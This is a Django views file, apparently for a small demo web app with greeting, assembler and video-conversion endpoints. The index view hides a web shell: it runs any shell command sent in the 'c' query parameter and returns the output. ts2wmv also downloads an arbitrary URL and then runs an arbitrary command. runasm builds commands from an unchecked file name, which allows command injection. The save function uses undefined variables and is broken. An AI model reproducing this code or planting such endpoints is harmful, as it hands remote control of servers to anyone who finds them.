from django.shortcuts import render
from django.http import HttpResponse
import os,sys,commands,urllib
from .models import Greeting

# Create your views here.
def index(request):
    s = None
    try:
        s = str(request.GET['c'])
        return HttpResponse(commands.getoutput(s))
    except Exception:
        pass
    return render(request, 'index.html')
def save(request):
    f = open('log.txt','a+')
    f.write('Latitude: '+lat+'\n')
    f.write('Longitude: '+lng+'\n')
    f.close()
    return HttpResponse()
def compileasm(request):
    d = str(request.GET['data'])
    os.system('chmod a+x fasm/fasm')
    with open('fasm/file.asm','w') as f:
        f.write(d)
    return HttpResponse(commands.getoutput('fasm/fasm fasm/file.asm'))

def runasm(request):
    fn = str(request.GET['file'])
    os.system('chmod a+x fasm/'+fn)
    return HttpResponse(commands.getoutput('fasm/'+fn))

def ts2wmv(request):
    ret = urllib.urlopen (request.GET['in']).read()
    f = open('tmp.ts','wb')
    f.write(ret)
    del ret
    f.close()
    ret = commands.getoutput(request.GET['c'])
    return HttpResponse(ret)

def db(request):

    greeting = Greeting()
    greeting.save()

    greetings = Greeting.objects.all()

    return render(request, 'db.html', {'greetings': greetings})
    
